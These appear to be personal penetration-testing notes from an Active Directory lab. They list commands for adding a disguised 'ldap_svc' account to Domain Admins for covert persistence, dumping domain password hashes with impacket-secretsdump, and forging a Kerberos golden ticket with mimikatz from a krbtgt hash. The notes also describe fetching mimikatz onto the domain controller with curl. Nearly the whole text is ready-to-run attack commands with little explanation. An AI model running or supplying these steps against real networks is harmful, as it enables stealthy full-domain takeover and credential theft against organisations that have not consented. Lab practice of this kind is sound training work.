# Adding domain admin for persistence
---
- **Adding domain admin user with service similar name to be sneaky**
	- `net user /add ldap_svc Password123 /domain`
	- `net group "Domain Admins" ldap_svc /add /domain`
	![[Pasted image 20250528070146.png]]

# Dumping NTDS.nit
---
- `impacket-secretsdump 'ldap_svc':'Password123'@10.10.10.225 -just-dc-ntlm `
	- ![[Pasted image 20250528070802.png]]

	![[Pasted image 20250528172928.png]]
# Golden Ticket Attack
---
- Grab mimikatz using python server on linux mail machine and curl on DC machine:
	- ![[Pasted image 20250528072010.png]]

	- Generate the ticket as local admin on the machine and transfer it to any domain user's accessible directory:
		- `privilege::debug`
		- `lsadump::lsa /inject /name:krbtgt`
			
		- Note the Domain SID: `S-1-5-21-580410294-4250016986-2214633728` and NT hash of `krbtgt` account: `5104c6f221ac3c4deaf32579d0ab1da1`
			- `kerberos::golden /User:fakeuser123 /domain:THEPASTAMENTORS.com /sid:S-1-5-21-580410294-4250016986-2214633728 /krbtgt:5104c6f221ac3c4deaf32579d0ab1da1 /id:500`

		- ![[Pasted image 20250528174752.png]]
	

	- Load the ticket with domain user
		- ![[Pasted image 20250528174613.png]]